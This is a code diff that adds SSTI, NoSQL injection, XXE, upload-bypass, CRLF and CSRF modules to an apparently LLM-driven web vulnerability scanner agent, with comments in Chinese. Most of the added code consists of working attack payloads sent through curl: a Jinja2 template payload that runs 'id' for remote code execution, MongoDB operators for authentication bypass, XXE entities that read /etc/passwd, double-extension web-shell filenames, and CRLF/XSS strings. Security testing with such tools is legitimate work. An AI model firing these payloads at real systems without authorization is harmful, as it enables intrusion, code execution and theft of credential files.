@@ -269,6 +269,30 @@ class ScannerAgent(BaseAgent):
         if strategy.get("test_headers", True):
             scan_tasks.append(("headers", self._test_security_headers(targets)))
 
+        # 13. SSTI 模板注入
+        if strategy.get("test_ssti", True):
+            scan_tasks.append(("ssti", self._test_ssti(targets)))
+
+        # 14. NoSQL 注入
+        if strategy.get("test_nosql", True):
+            scan_tasks.append(("nosql", self._test_nosql(targets)))
+
+        # 15. XXE 外部实体
+        if strategy.get("test_xxe", True):
+            scan_tasks.append(("xxe", self._test_xxe(targets)))
+
+        # 16. 文件上传绕过
+        if strategy.get("test_upload", True):
+            scan_tasks.append(("upload", self._test_upload(targets)))
+
+        # 17. CRLF 注入
+        if strategy.get("test_crlf", True):
+            scan_tasks.append(("crlf", self._test_crlf(targets)))
+
+        # 18. CSRF 检测
+        if strategy.get("test_csrf", True):
+            scan_tasks.append(("csrf", self._test_csrf(targets)))
+
         # 并发执行
         logger.info("[scanner] 启动 %d 个检测模块...", len(scan_tasks))
         results = await asyncio.gather(
@@ -416,7 +440,9 @@ class ScannerAgent(BaseAgent):
             '{"use_nuclei": true, "test_sqli": true, "test_xss": true, '
             '"test_ssrf": false, "test_idor": true, "test_redirect": true, '
             '"test_dir_traversal": true, "test_cmd_injection": false, '
-            '"test_graphql": true, "test_jwt": true, "test_cors": true, "test_headers": true}'
+            '"test_graphql": true, "test_jwt": true, "test_cors": true, "test_headers": true, '
+            '"test_ssti": true, "test_nosql": true, "test_xxe": true, '
+            '"test_upload": true, "test_crlf": true, "test_csrf": true}'
         )
 
         try:
@@ -436,7 +462,9 @@ class ScannerAgent(BaseAgent):
                 "test_ssrf": True, "test_idor": True, "test_redirect": True,
                 "test_dir_traversal": True, "test_cmd_injection": True,
                 "test_graphql": True, "test_jwt": True, "test_cors": True,
-                "test_headers": True,
+                "test_headers": True, "test_ssti": True, "test_nosql": True,
+                "test_xxe": True, "test_upload": True, "test_crlf": True,
+                "test_csrf": True,
             }
 
     # ---- Nuclei 模板扫描 ----
@@ -1513,6 +1541,334 @@ class ScannerAgent(BaseAgent):
                     findings.append(f)
                     self.findings.append(f)
 
+        return findings
+
+    # ---- SSTI 模板注入 ----
+
+    async def _test_ssti(self, targets: dict) -> list[Finding]:
+        """SSTI 模板注入检测"""
+        findings = []
+        urls = targets["urls"] + targets["api_endpoints"]
+
+        # 数学探针（不同模板引擎）
+        ssti_probes = [
+            ("{{7*7}}", "49", "Jinja2/Twig/Mako"),
+            ("${7*7}", "49", "FreeMarker/Velocity/OGNL"),
+            ("<%= 7*7 %>", "49", "ERB/Ruby"),
+            ("#{7*7}", "49", "Slim/Pug"),
+            ("{{7*'7'}}", "777", "Jinja2 (string repeat)"),
+        ]
+
+        for url in urls[:5]:
+            parsed = urlparse(url)
+            params = parse_qs(parsed.query)
+            if not params:
+                continue
+
+            for param_name in params:
+                for payload, expected, engine in ssti_probes:
+                    test_params = {k: v[0] for k, v in params.items()}
+                    test_params[param_name] = payload
+                    test_url = urlunparse(parsed._replace(query=urlencode(test_params)))
+
+                    r = await run_command(f"curl -sL -m 10 '{test_url}'", timeout=15)
+                    if r.success and expected in r.stdout:
+                        f = Finding(
+                            vuln_type="ssti",
+                            title=f"SSTI 模板注入 ({engine}): 参数 {param_name}",
+                            url=url, parameter=param_name,
+                            payload=payload,
+                            evidence=f"探针 {payload} 返回计算结果 {expected}，引擎: {engine}",
+                            severity="critical", confidence="confirmed",
+                            poc=test_url,
+                        )
+                        findings.append(f)
+                        self.findings.append(f)
+
+                        # 尝试 RCE payload
+                        rce_payload = "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
+                        test_params[param_name] = rce_payload
+                        rce_url = urlunparse(parsed._replace(query=urlencode(test_params)))
+                        rce_r = await run_command(f"curl -sL -m 10 '{rce_url}'", timeout=15)
+                        if rce_r.success and "uid=" in rce_r.stdout:
+                            f2 = Finding(
+                                vuln_type="ssti",
+                                title=f"SSTI RCE: 参数 {param_name}",
+                                url=url, parameter=param_name,
+                                payload=rce_payload,
+                                evidence=re.search(r'uid=\d+.*', rce_r.stdout).group()[:100],
+                                severity="critical", confidence="confirmed",
+                                poc=rce_url,
+                            )
+                            findings.append(f2)
+                            self.findings.append(f2)
+                        return findings
+        return findings
+
+    # ---- NoSQL 注入 ----
+
+    async def _test_nosql(self, targets: dict) -> list[Finding]:
+        """NoSQL 注入检测（MongoDB 操作符注入）"""
+        findings = []
+        urls = targets["urls"] + targets["api_endpoints"]
+
+        nosql_payloads = [
+            # 认证绕过
+            ({"password": {"$ne": ""}}, "认证绕过 ($ne)"),
+            ({"password": {"$gt": ""}}, "认证绕过 ($gt)"),
+            ({"password": {"$regex": "^.*"}}, "认证绕过 ($regex)"),
+            ({"$where": "1==1"}, "JS 执行 ($where)"),
+            ({"username": {"$in": ["admin", "root"]}}, "枚举 ($in)"),
+        ]
+
+        for url in urls[:5]:
+            parsed = urlparse(url)
+            base = url.rstrip("/")
+
+            # 识别登录/搜索端点
+            is_auth_endpoint = any(kw in base.lower() for kw in ["login", "auth", "signin", "search"])
+            if not is_auth_endpoint:
+                continue
+
+            for payload, desc in nosql_payloads[:3]:
+                payload_str = json.dumps(payload)
+                r = await run_command(
+                    f"curl -sL -m 10 -X POST -H 'Content-Type: application/json' -d '{payload_str}' '{url}'",
+                    timeout=15,
+                )
+                if r.success and len(r.stdout) > 20:
+                    resp = r.stdout.lower()
+                    # 检查是否绕过了认证
+                    if "token" in resp or "success" in resp or "welcome" in resp:
+                        f = Finding(
+                            vuln_type="nosqli",
+                            title=f"NoSQL 注入: {desc}",
+                            url=url, parameter="JSON body",
+                            payload=payload_str,
+                            evidence=f"端点接受 MongoDB 操作符，响应 {len(r.stdout)} bytes",
+                            severity="critical", confidence="probable",
+                            poc=f"curl -X POST -H 'Content-Type: application/json' -d '{payload_str}' {url}",
+                        )
+                        findings.append(f)
+                        self.findings.append(f)
+                        return findings
+
+            # URL 编码括号变体
+            params = parse_qs(parsed.query)
+            for param_name in params:
+                for op in ["$ne", "$gt", "$regex"]:
+                    test_params = {k: v[0] for k, v in params.items()}
+                    test_params[f"{param_name}[{op}]"] = "test"
+                    test_url = urlunparse(parsed._replace(query=urlencode(test_params)))
+                    r = await run_command(f"curl -sL -m 10 '{test_url}'", timeout=15)
+                    if r.success and len(r.stdout) > 20:
+                        if "<!doctype html>" not in r.stdout.lower()[:200]:
+                            f = Finding(
+                                vuln_type="nosqli",
+                                title=f"NoSQL 注入 (URL编码): 参数 {param_name}",
+                                url=url, parameter=f"{param_name}[{op}]",
+                                payload=f"{param_name}[$op]=value",
+                                evidence=f"URL 编码操作符变体返回有效响应",
+                                severity="high", confidence="possible",
+                                poc=test_url,
+                            )
+                            findings.append(f)
+                            self.findings.append(f)
+                            return findings
+        return findings
+
+    # ---- XXE 外部实体注入 ----
+
+    async def _test_xxe(self, targets: dict) -> list[Finding]:
+        """XXE 检测（JSON→XML 转换 + 外部实体注入）"""
+        findings = []
+        urls = targets["api_endpoints"]
+
+        xxe_payload = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root><data>&xxe;</data></root>'
+        xxe_svg = '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg xmlns="http://www.w3.org/2000/svg">&xxe;</svg>'
+
+        for url in urls[:5]:
+            # 尝试将 JSON 端点改为 XML 请求
+            r = await run_command(
+                f"curl -sL -m 10 -X POST -H 'Content-Type: application/xml' -d '{xxe_payload}' '{url}'",
+                timeout=15,
+            )
+            if r.success:
+                if "root:" in r.stdout or "/bin/bash" in r.stdout or "/sbin/nologin" in r.stdout:
+                    f = Finding(
+                        vuln_type="xxe",
+                        title=f"XXE 文件读取: {url}",
+                        url=url, parameter="XML body",
+                        payload=xxe_payload[:100],
+                        evidence="成功读取 /etc/passwd",
+                        severity="critical", confidence="confirmed",
+                        poc=f"curl -X POST -H 'Content-Type: application/xml' -d '{xxe_payload}' {url}",
+                    )
+                    findings.append(f)
+                    self.findings.append(f)
+                    return findings
+
+            # SVG 上传场景
+            r2 = await run_command(
+                f"curl -sL -m 10 -X POST -H 'Content-Type: image/svg+xml' -d '{xxe_svg}' '{url}'",
+                timeout=15,
+            )
+            if r2.success and ("root:" in r2.stdout or "/bin/bash" in r2.stdout):
+                f = Finding(
+                    vuln_type="xxe",
+                    title=f"XXE (SVG): {url}",
+                    url=url, parameter="SVG upload",
+                    payload=xxe_svg[:100],
+                    evidence="SVG XXE 成功读取文件",
+                    severity="critical", confidence="confirmed",
+                )
+                findings.append(f)
+                self.findings.append(f)
+                return findings
+        return findings
+
+    # ---- 文件上传绕过 ----
+
+    async def _test_upload(self, targets: dict) -> list[Finding]:
+        """文件上传绕过检测"""
+        findings = []
+        urls = targets["urls"] + targets["api_endpoints"]
+
+        # 识别上传端点
+        upload_endpoints = []
+        for url in urls:
+            if any(kw in url.lower() for kw in ["upload", "file", "image", "avatar", "attach"]):
+                upload_endpoints.append(url)
+
+        # 常见上传路径
+        for url in targets["urls"][:2]:
+            base = url.rstrip("/")
+            for path in ["/upload", "/api/upload", "/api/files", "/file/upload", "/api/image"]:
+                ep = f"{base}{path}"
+                if ep not in upload_endpoints:
+                    r = await run_command(f"curl -s -o /dev/null -w '%{{http_code}}' -m 3 '{ep}'", timeout=5)
+                    if r.success and r.stdout.strip().strip("'\" ") in ("200", "400", "405", "415"):
+                        upload_endpoints.append(ep)
+
+        for ep in upload_endpoints[:3]:
+            bypass_names = [
+                "test.php.jpg", "test.php%00.jpg", "test.asp;.jpg",
+                "test.pHp", "test.php5", "test.phtml", "test.phar",
+                "test.jpg.php", "test.jpg;.php", "test.php;.jpg",
+            ]
+            for name in bypass_names[:5]:
+                r = await run_command(
+                    f"curl -sL -m 10 -F 'file=@/dev/null;filename={name}' '{ep}'",
+                    timeout=15,
+                )
+                if r.success:
+                    resp = r.stdout.lower()
+                    if any(kw in resp for kw in ["success", "uploaded", "filename", "path", "url"]):
+                        f = Finding(
+                            vuln_type="upload",
+                            title=f"文件上传绕过: {name}",
+                            url=ep, parameter="filename",
+                            payload=f"filename: {name}",
+                            evidence=f"端点接受了双扩展名/截断文件名",
+                            severity="high", confidence="possible",
+                            poc=f"curl -F 'file=@shell.php;filename={name}' {ep}",
+                        )
+                        findings.append(f)
+                        self.findings.append(f)
+                        return findings
+        return findings
+
+    # ---- CRLF 注入 ----
+
+    async def _test_crlf(self, targets: dict) -> list[Finding]:
+        """CRLF 注入检测"""
+        findings = []
+        crlf_payloads = [
+            "%0D%0AX-Injected:true",
+            "%0d%0a%0d%0a<script>alert(1)</script>",
+            "%5Cr%5CnX-Injected:true",
+            "%E5%98%8A%E5%98%8DX-Injected:true",
+            "\r\nX-Injected:true",
+        ]
+
+        for url in targets["urls"][:3]:
+            parsed = urlparse(url)
+            params = parse_qs(parsed.query)
+            if not params:
+                continue
+
+            for param_name in params:
+                for payload in crlf_payloads[:3]:
+                    test_params = {k: v[0] for k, v in params.items()}
+                    test_params[param_name] = payload
+                    test_url = urlunparse(parsed._replace(query=urlencode(test_params)))
+
+                    r = await run_command(f"curl -sI -m 10 '{test_url}'", timeout=15)
+                    if r.success and "x-injected" in r.stdout.lower():
+                        f = Finding(
+                            vuln_type="crlf",
+                            title=f"CRLF 注入: 参数 {param_name}",
+                            url=url, parameter=param_name,
+                            payload=payload,
+                            evidence="响应头中出现注入的 X-Injected 头",
+                            severity="high", confidence="confirmed",
+                            poc=test_url,
+                        )
+                        findings.append(f)
+                        self.findings.append(f)
+                        return findings
+        return findings
+
+    # ---- CSRF 检测 ----
+
+    async def _test_csrf(self, targets: dict) -> list[Finding]:
+        """CSRF 检测"""
+        findings = []
+
+        for url in targets["urls"][:3]:
+            r = await run_command(f"curl -sL -m 10 '{url}'", timeout=15)
+            if not r.success:
+                continue
+
+            html = r.stdout
+            # 检查 Cookie SameSite 属性
+            headers_r = await run_command(f"curl -sI -m 5 '{url}'", timeout=10)
+            if headers_r.success:
+                cookies = re.findall(r'(?i)set-cookie:\s*.+', headers_r.stdout)
+                for cookie in cookies:
+                    if "samesite" not in cookie.lower():
+                        # 没有 SameSite 属性
+                        if any(kw in cookie.lower() for kw in ["session", "token", "auth", "sid"]):
+                            f = Finding(
+                                vuln_type="csrf",
+                                title="Cookie 缺少 SameSite 属性",
+                                url=url, parameter="Set-Cookie",
+                                evidence=f"Cookie 没有 SameSite 属性: {cookie[:80]}",
+                                severity="medium", confidence="confirmed",
+                            )
+                            findings.append(f)
+                            self.findings.append(f)
+
+            # 检查表单是否有 CSRF token
+            forms = re.findall(r'<form[^>]*>(.*?)</form>', html, re.DOTALL | re.IGNORECASE)
+            for form in forms[:3]:
+                has_csrf = bool(re.search(
+                    r'(?i)(csrf|xsrf|_token|authenticity_token|__RequestVerificationToken)',
+                    form,
+                ))
+                if not has_csrf:
+                    # 检查是否是状态变更表单
+                    if re.search(r'(?i)(method\s*=\s*["\']post["\']|type\s*=\s*["\']submit["\'])', form):
+                        f = Finding(
+                            vuln_type="csrf",
+                            title="表单缺少 CSRF Token",
+                            url=url, parameter="form",
+                            evidence="POST 表单中未发现 CSRF token 字段",
+                            severity="medium", confidence="possible",
+                        )
+                        findings.append(f)
+                        self.findings.append(f)
+                        break
         return findings
 
     # ---- LLM 分析 ----
